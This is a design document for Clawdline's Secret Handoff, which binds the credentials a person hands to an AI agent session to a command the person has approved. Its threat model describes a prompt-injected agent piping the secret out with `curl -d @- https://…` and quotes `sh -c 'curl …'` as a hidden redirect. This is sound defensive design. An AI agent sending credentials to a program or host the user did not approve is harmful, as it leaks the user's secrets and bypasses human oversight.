# Secret Handoff

Secret Handoff is the person-to-Session path for a password, credential, or API key needed by a local tool. The Note is an invitation and status surface, never the value's storage. A normal Session message and its transcript are also unsuitable: they retain what was sent. The receiving agent names the credential in the Note summary, shown as the label immediately above the dedicated multi-line input. The summary is a non-secret label, never the value. The Note also names the exact command that will receive the value, shown beside the input before the person hands anything off.

## Contract

1. The Note identifies a live target conversation, the purpose of the requested secret, and the exact receiving command: an argv whose first entry is the absolute path of the executable. The request must not contain a secret value. Only the person may submit the value. A Secret Handoff Note without a command is refused at creation, and so is one whose executable is not an absolute, clean path or whose arguments contain control or invisible formatting characters. Every other Note kind is refused if it names a command.
2. The dedicated input does not copy the value into the Session composer, a draft, a browser URL, browser storage, a notification, or a Note field. Its request travels through the existing authenticated local HTTP path or Cloud's end-to-end encrypted action channel. Cloud may queue ciphertext but must never see the plaintext. The submission repeats the command the console showed; the daemon refuses one that does not match the Note's (`secret_handoff_command_unconfirmed`), so a console that never displayed the command cannot hand off a value blind.
3. The machine holds the value only in memory with a short deadline. It returns an opaque receipt and status, never the value, to the browser. A successful submission marks the Note handled immediately, in the same transaction as its durable receipt. Reloading keeps the Note handled. Completion does not consume the value: the target Session can still claim it once until a restart or deadline discards it. A rejected submission leaves the Note pending. A completed Note rejects new submissions; request a fresh Note when another handoff is needed.
4. The receiving live Session retrieves the value once through a local command that feeds it to a tool on standard input. That command presents the argv it is about to run, and the daemon hands the value over only if that argv is identical, entry for entry, to the one the Note declared. The command opens a short-lived loopback receiver with a random nonce; the daemon sends the value to that receiver. No HTTP response contains the value, and the command never prints it. A different Session, a stale Session, a browser read, a repeated claim, and a claim with any other command are refused.
5. A claim with another command (`secret_handoff_command_mismatch`) receives nothing. Any waiting value is wiped, and the Note is resolved as `Secret Handoff refused: command mismatch`. The value is not kept for a second attempt: a Session that has just asked to give it to a program the person did not see is behaving as a prompt-injected agent would, and holding the value for it only lengthens its window. Handing off again is the person's decision.
6. The value is excluded from durable receipts, audit events, request logs, and diagnostic error strings. Limits and error codes mention size or state, never content. The agent must keep the tool's own output and logs from repeating the value.

## The receiving command

The command is part of what the person approves. Before this binding existed, the Session chose the command when it claimed the value, so a prompt-injected agent could create an innocent-looking Note and then run `clawdline secret run <id> -- curl -d @- https://…`; the person never saw where the value went.

`clawdline note create` resolves a bare executable name in the Note's `command` with `exec.LookPath` in the agent's own environment and stores the absolute path. `clawdline secret run` resolves its command the same way before it claims, presents that argv, and runs exactly that argv. The daemon compares the two byte for byte and refuses a relative executable at creation, so a direct HTTP caller cannot store a bare name either. As a result, `gh` and `/usr/bin/gh` match only when they are the same path, and a changed `PATH` that sends `gh` to another file is a mismatch. Symbolic links are not resolved: the path shown is the path executed, and redirecting a link requires write access to that location, which is the same power as replacing the binary.

The console shows the command as literal text in shell quoting (`/usr/bin/gh auth login --with-token`; an argument with spaces is quoted, so `sh -c 'curl …'` stays visible as one argument). A Note without a command, such as one written before this field existed, shows that it cannot be handed off and disables the input. Cloud carries the same Note row to the hosted console and the same submission back to the local route, so the daemon enforces the match whether or not a given console displays it.

The binding names the program, not its behaviour. A declared command such as a shell, `curl`, or a tool pointed at an unfamiliar host still sends the value wherever that program sends it. The person's check is the protection there, which is why the command is shown in full before submission.

## Why this boundary

`human_interventions.go` persists Note title, summary, action, reason, detail, and a Secret Handoff Note's command. `Interventions.tsx` sends an answer Note's draft through `deliverUntilSeen`, which becomes a normal Session message. Neither path can carry a secret. The Note can safely provide the request, the receiving command, the input, and a non-sensitive delivery status. The separate payload needs a short-lived, single-use machine-side handoff.

The protection is against incidental retention and disclosure by Clawdline's normal collaboration surfaces and Cloud, and against a Session that gives the value to a program other than the one the person approved. It cannot protect a secret from the tool or service to which the person intentionally gives it, or from a compromised receiving machine or Session. The local machine credential remains the trust boundary: another local process holding it could assert the target conversation's identity. The UI should name that Session and the receiving command before enabling submission.

## Person-facing steps

1. Open the **Secret Handoff** request in the intended Session and check its purpose, its Session name, and the command after **This value will be given to:**. Hand off only if that is the tool you expect.
2. Paste the value into the dedicated field and submit. The button shows progress, then the Note moves to recently handled as soon as the machine receives the value, before the panel folds away. Clawdline never shows the value again.
3. The Session uses the one-time handoff with that command. If it expires, the machine restarts, or the Session asks for it with a different command, the value is gone; ask the Session for a fresh Secret Handoff Note only if you still trust the request.
